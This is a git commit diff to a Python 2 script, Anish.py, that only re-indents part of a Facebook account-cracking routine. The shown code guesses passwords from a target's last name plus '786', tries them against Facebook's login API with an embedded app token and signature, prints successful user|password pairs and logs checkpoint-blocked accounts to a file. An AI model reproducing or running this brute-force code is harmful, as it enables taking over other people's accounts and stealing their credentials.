1be20bc1c0e7e1e3e781ee6f0dc96257ec5a75bc
thsanki <59386036+thsanki@users.noreply.github.com>
2020-01-06 11:57:50 +0530

    Update Anish.py

--- Anish.py
+++ Anish.py
@@ -406,14 +406,14 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-													        pass7 = b['last_name']+'786'
-													        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													        q = json.load(data)
-													        if 'access_token' in q:
-														        print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-														        oks.append(user+pass7)
-													        else:
-														        if 'www.facebook.com' in q["error_msg"]:
+													                pass7 = b['last_name']+'786'
+													                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													                q = json.load(data)
+													                if 'access_token' in q:
+														                print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+														                oks.append(user+pass7)
+													                else:
+														                if 'www.facebook.com' in q["error_msg"]:
 															        print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
 															        cek = open("out/super_cp.txt", "a")
 															        cek.write(user+"|"+pass7+"\n")
